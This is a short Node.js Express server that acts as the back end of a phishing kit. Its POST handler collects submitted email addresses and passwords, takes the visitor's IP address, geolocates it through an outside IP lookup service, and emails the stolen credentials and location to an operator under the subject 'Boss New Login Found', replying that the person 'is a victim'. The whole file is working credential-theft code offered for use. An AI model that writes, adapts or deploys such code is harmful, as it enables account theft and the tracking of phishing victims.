const express = require('express');
const cors = require("cors");
const axios = require('axios');
const sendEmail = require("./utils/mail");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/", async (req, res) => {
    const data = req.body;
    const email = data.receiver;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    // const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}\nClient IP: ${clientIp}`;

    try {
      const ip = clientIp.split(',')[0];
      const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
      const { city, regionName, country } = geoResponse.data;
  
      const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}\nClient IP: ${ip}\nLocation: ${city}, ${regionName}, ${country}`;
      console.log(message); // Log the message

      await sendEmail(email,"Boss New Login Found",message);
      res.send(`Success: ${data.name} - ${data.email} is a victim!`);
    } catch (error) {
      console.error('Error fetching geolocation data:', error.message);
      res.status(500).send('Error processing request');
    }

    // await sendEmail(email,"Boss New Login Found",message);
    // res.send(`Success: ${data.name} - ${data.email} is a victim!`);
});

app.listen(PORT, () => {
  console.log(`Express server running at http://localhost:${PORT}/`);
});